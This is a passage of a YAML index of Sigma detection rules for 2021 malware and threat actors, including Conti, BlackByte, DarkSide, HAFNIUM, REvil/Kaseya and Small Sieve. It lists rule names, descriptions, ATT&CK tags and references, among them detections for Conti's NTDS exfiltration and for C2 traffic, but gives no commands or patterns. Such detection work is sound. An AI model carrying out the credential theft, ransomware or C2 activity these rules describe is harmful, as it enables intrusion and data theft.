  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.t1190
  - attack.initial-access
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20210126045316/https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
  - https://github.com/darrenmartyn/VisualDoor
  false_positives:
  - Unknown
  notes: ''
- detection_id: 999e8307-a775-4d5f-addc-4855632335be
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/BlackByte/proc_creation_win_malware_blackbyte_ransomware.yml
  name: Potential BlackByte Ransomware Activity
  description: Detects command line patterns used by BlackByte ransomware in different
    operations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Impact
  techniques:
  - T1059.001
  - T1140
  - T1485
  - T1498
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.impact
  - attack.t1485
  - attack.t1498
  - attack.t1059.001
  - attack.t1140
  - detection.emerging-threats
  time_window: ''
  references:
  - https://redcanary.com/blog/blackbyte-ransomware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 83314318-052a-4c90-a1ad-660ece38d276
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/BlackByte/registry_set_win_malware_blackbyte_privesc_registry.yml
  name: Blackbyte Ransomware Registry
  description: 'Detects specific windows registry modifications made by BlackByte
    ransomware variants.

    BlackByte set three different registry values to escalate privileges and begin
    setting the stage for lateral movement and encryption.

    This rule triggers when any of the following registry keys are set to DWORD 1,
    however all three should be investigated as part of a larger BlackByte ransomware
    detection and response effort.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  - detection.emerging-threats
  time_window: ''
  references:
  - https://redcanary.com/blog/blackbyte-ransomware/?utm_source=twitter&utm_medium=social
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7b30e0a7-c675-4b24-8a46-82fa67e2433d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Conti/proc_creation_win_malware_conti.yml
  name: Conti Volume Shadow Listing
  description: Detects a command used by conti to find volume shadow backups
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.t1587.001
  - attack.resource-development
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/vxunderground/status/1423336151860002816?s=20
  - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: aa92fd02-09f2-48b0-8a93-864813fb8f41
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Conti/proc_creation_win_malware_conti_7zip.yml
  name: Conti NTDS Exfiltration Command
  description: Detects a command used by conti to exfiltrate NTDS
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1560
  tags:
  - attack.collection
  - attack.t1560
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/vxunderground/status/1423336151860002816?s=20
  - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: 689308fc-cfba-4f72-9897-796c1dc61487
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Conti/proc_creation_win_malware_conti_ransomware_commands.yml
  name: Potential Conti Ransomware Activity
  description: Detects a specific command used by the Conti ransomware group
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.impact
  - attack.s0575
  - attack.t1486
  - detection.emerging-threats
  time_window: ''
  references:
  - https://news.sophos.com/en-us/2021/09/03/conti-affiliates-use-proxyshell-exchange-exploit-in-ransomware-attacks/
  - https://twitter.com/VK_Intel/status/1447795359900704769?t=Xz7vaLTvaaCZ5kHoZa6gMw&s=19
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 2f47f1fd-0901-466e-a770-3b7092834a1b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Conti/proc_creation_win_malware_conti_ransomware_database_dump.yml
  name: Potential Conti Ransomware Database Dumping Activity Via SQLCmd
  description: Detects a command used by conti to dump database
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1005
  tags:
  - attack.collection
  - attack.t1005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/vxunderground/status/1423336151860002816?s=20
  - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection
  - https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-ver15
  false_positives:
  - Unknown
  notes: ''
- detection_id: 965fff6c-1d7e-4e25-91fd-cdccd75f7d2c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/DarkSide/proc_creation_win_malware_darkside_ransomware.yml
  name: DarkSide Ransomware Pattern
  description: Detects DarkSide Ransomware and helpers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204
  tags:
  - attack.execution
  - attack.t1204
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2021/05/shining-a-light-on-darkside-ransomware-operations.html
  - https://app.any.run/tasks/8b9a571b-bcc1-4783-ba32-df4ba623b9c0/
  - https://www.joesandbox.com/analysis/411752/0/html#7048BB9A06B8F2DD9D24C77F389D7B2B58D2
  false_positives:
  - Unknown
  - UAC bypass method used by other malware
  notes: ''
- detection_id: 93d5f1b4-36df-45ed-8680-f66f242b8415
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Devil-Bait/file_event_win_malware_devil_bait_script_drop.yml
  name: Potential Devil Bait Related Indicator
  description: Detects the creation of ".xml" and ".txt" files in folders of the "\AppData\Roaming\Microsoft"
    directory by uncommon processes. This behavior was seen common across different
    Devil Bait samples and stages as described by the NCSC
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e8954be4-b2b8-4961-be18-da1a5bda709c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Devil-Bait/proc_creation_win_malware_devil_bait_output_redirect.yml
  name: Potential Devil Bait Malware Reconnaissance
  description: Detects specific process behavior observed with Devil Bait samples
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf
  - https://www.virustotal.com/gui/file/fa71eee906a7849ba3f4bab74edb577bd1f1f8397ca428591b4a9872ce1f1e9b/behavior
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 514c50c9-373a-46e5-9012-f0327c526c8f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Devil-Bait/proxy_malware_devil_bait_c2_communication.yml
  name: Devil Bait Potential C2 Communication Traffic
  description: Detects potential C2 communication related to Devil Bait malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 640dc51c-7713-4faa-8a0e-e7c0d9d4654c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/FoggyWeb/image_load_malware_foggyweb_nobelium.yml
  name: FoggyWeb Backdoor DLL Loading
  description: Detects DLL hijacking technique used by NOBELIUM in their FoggyWeb
    backdoor. Which loads a malicious version of the expected "version.dll" dll
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1587
  tags:
  - attack.resource-development
  - attack.t1587
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f0bafe60-1240-4798-9e60-4364b97e6bad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Goofy-Guineapig/file_event_win_malware_goofy_guineapig_file_indicators.yml
  name: Goofy Guineapig Backdoor IOC
  description: Detects malicious indicators seen used by the Goofy Guineapig malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 477a5ed3-a374-4282-9f3b-ed94e159a108
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Goofy-Guineapig/proc_creation_win_malware_goofy_guineapig_broken_cmd.yml
  name: Potential Goofy Guineapig Backdoor Activity
  description: Detects a specific broken command that was used by Goofy-Guineapig
    as described by the NCSC report.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: bdbab15a-3826-48fa-a1b7-723cd8f32fcc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Goofy-Guineapig/proc_creation_win_malware_goofy_guineapig_googleupdate_uncommon_child_instance.yml
  name: Potential Goofy Guineapig GoolgeUpdate Process Anomaly
  description: Detects "GoogleUpdate.exe" spawning a new instance of itself in an
    uncommon location as seen used by the Goofy Guineapig backdoor
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4f573bb6-701a-4b8d-91db-87ae106e9a61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Goofy-Guineapig/proxy_malware_goofy_gunieapig_c2_communication.yml
  name: Goofy Guineapig Backdoor Potential C2 Communication
  description: Detects potential C2 communication related to Goofy Guineapig backdoor
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 8c15dd74-9570-4f48-80b2-29996fd91ee6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Goofy-Guineapig/win_system_malware_goofy_guineapig_service_persistence.yml
  name: Goofy Guineapig Backdoor Service Creation
  description: Detects service creation persistence used by the Goofy Guineapig backdoor
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a1507d71-0b60-44f6-b17c-bf53220fdd88
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Moriya-Rootkit/file_event_win_moriya_rootkit.yml
  name: Moriya Rootkit File Created
  description: Detects the creation of a file named "MoriyaStreamWatchmen.sys" in
    a specific location. This filename was reported to be related to the Moriya rootkit
    as described in the securelist's Operation TunnelSnake report.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/operation-tunnelsnake-and-moriya-rootkit/101831
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1d218616-71b0-4c40-855b-9dbe75510f7f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Netwire/registry_add_malware_netwire.yml
  name: Potential NetWire RAT Activity - Registry
  description: Detects registry keys related to NetWire RAT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_add
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.fortinet.com/blog/threat-research/new-netwire-rat-variant-spread-by-phishing
  - https://resources.infosecinstitute.com/topic/netwire-malware-what-it-is-how-it-works-and-how-to-prevent-it-malware-spotlight/
  - https://unit42.paloaltonetworks.com/guloader-installing-netwire-rat/
  - https://blogs.blackberry.com/en/2021/09/threat-thursday-netwire-rat-is-coming-down-the-line
  - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2bd63d53-84d4-4210-80ff-bf0658f1bf78
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Pingback/file_event_win_malware_pingback_backdoor.yml
  name: Pingback Backdoor File Indicators
  description: Detects the use of Pingback backdoor that creates ICMP tunnel for C2
    as described in the trustwave report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1574.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel
  - https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 35a7dc42-bc6f-46e0-9f83-81f8e56c8d4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Pingback/image_load_malware_pingback_backdoor.yml
  name: Pingback Backdoor DLL Loading Activity
  description: Detects the use of Pingback backdoor that creates ICMP tunnel for C2
    as described in the trustwave report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1574.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel
  - https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b2400ffb-7680-47c0-b08a-098a7de7e7a9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Pingback/proc_creation_win_malware_pingback_backdoor.yml
  name: Pingback Backdoor Activity
  description: Detects the use of Pingback backdoor that creates ICMP tunnel for C2
    as described in the trustwave report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1574.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel
  - https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 39466c42-c189-476a-989f-8cdb135c163a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Small-Sieve/file_event_win_malware_small_sieve_evasion_typo.yml
  name: Small Sieve Malware File Indicator Creation
  description: Detects filename indicators that contain a specific typo seen used
    by the Small Sieve malware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/small-sieve/NCSC-MAR-Small-Sieve.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 21117127-21c8-437a-ae03-4b51e5a8a088
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Small-Sieve/proc_creation_win_malware_small_sieve_cli_arg.yml
  name: Small Sieve Malware CommandLine Indicator
  description: Detects specific command line argument being passed to a binary as
    seen being used by the malware Small Sieve.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1574.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/small-sieve/NCSC-MAR-Small-Sieve.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b0422664-37a4-4e78-949a-4a139309eaf0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Small-Sieve/proxy_malware_small_sieve_telegram_communication.yml
  name: Small Sieve Malware Potential C2 Communication
  description: Detects potential C2 communication related to Small Sieve malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/goofy-guineapig/NCSC-MAR-Goofy-Guineapig.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 65c6e3c1-fb28-4c03-a51e-84919d8185f1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/Malware/Small-Sieve/registry_set_malware_small_sieve_evasion_typo.yml
  name: Small Sieve Malware Registry Persistence
  description: Detects registry value with specific intentional typo and strings seen
    used by the Small Sieve malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/small-sieve/NCSC-MAR-Small-Sieve.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: bbb2dedd-a0e3-46ab-ba6c-6c82ae7a9aa7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/TA/HAFNIUM/proc_creation_win_apt_hafnium.yml
  name: HAFNIUM Exchange Exploitation Activity
  description: Detects activity observed by different researchers to be HAFNIUM group
    activity (or related) on Exchange servers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053
  - T1546
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1546
  - attack.t1053
  - attack.g0125
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/
  - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
  - https://discuss.elastic.co/t/detection-and-response-for-hafnium-activity/266289/3
  - https://twitter.com/GadixCRK/status/1369313704869834753?s=20
  - https://twitter.com/BleepinComputer/status/1372218235949617161
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 67bce556-312f-4c81-9162-c3c9ff2599b2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/TA/HAFNIUM/web_exchange_exploitation_hafnium.yml
  name: Exchange Exploitation Used by HAFNIUM
  description: Detects exploitation attempts in Exchange server logs as described
    in blog posts reporting on HAFNIUM group activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.g0125
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
  - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
  false_positives:
  - Legitimate access to other web applications that use the same folder names as
    Exchange (e.g. owa, ecp) but are not Microsoft Exchange related
  notes: ''
- detection_id: 5de632bc-7fbd-4c8a-944a-fce55c59eae5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/TA/Kaseya-Supply-Chain/proc_creation_win_apt_revil_kaseya.yml
  name: REvil Kaseya Incident Malware Patterns
  description: Detects process command line patterns and locations used by REvil group
    in Kaseya incident (can also match on other malware)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  - attack.g0115
  - detection.emerging-threats
  time_window: ''
  references:
  - https://community.sophos.com/b/security-blog/posts/active-ransomware-attack-on-kaseya-customers
  - https://www.joesandbox.com/analysis/443736/0/html
  - https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b
  - https://therecord.media/revil-ransomware-executes-supply-chain-attack-via-malicious-kaseya-update/
  - https://blog.truesec.com/2021/07/04/kaseya-supply-chain-attack-targeting-msps-to-deliver-revil-ransomware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 33a2d1dd-f3b0-40bd-8baf-7974468927cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/TA/PRIVATELOG/image_load_usp_svchost_clfsw32.yml
  name: APT PRIVATELOG Image Load Pattern
  description: Detects an image load pattern as seen when a tool named PRIVATELOG
    is used and rarely observed under legitimate circumstances
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20210901184449/https://www.fireeye.com/blog/threat-research/2021/09/unknown-actor-using-clfs-log-files-for-stealth.html
  false_positives:
  - Rarely observed
  notes: ''
- detection_id: 7ba08e95-1e0b-40cd-9db5-b980555e42fd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/TA/SOURGUM/proc_creation_win_apt_sourgrum.yml
  name: SOURGUM Actor Behaviours
  description: Suspicious behaviours related to an actor tracked by Microsoft as SOURGUM
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546
  - T1546.015
  tags:
  - attack.t1546
  - attack.t1546.015
  - attack.persistence
  - attack.privilege-escalation
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/c299063e3eae8ddc15839767e83b9808fd43418dc5a1af7e4f44b97ba53fbd3d/detection
  - https://github.com/Azure/Azure-Sentinel/blob/43e9be273dca321295190bfc4902858e009d4a35/Detections/MultipleDataSources/SOURGUM_IOC.yaml
  - https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/
  false_positives:
  - Unknown
  notes: ''
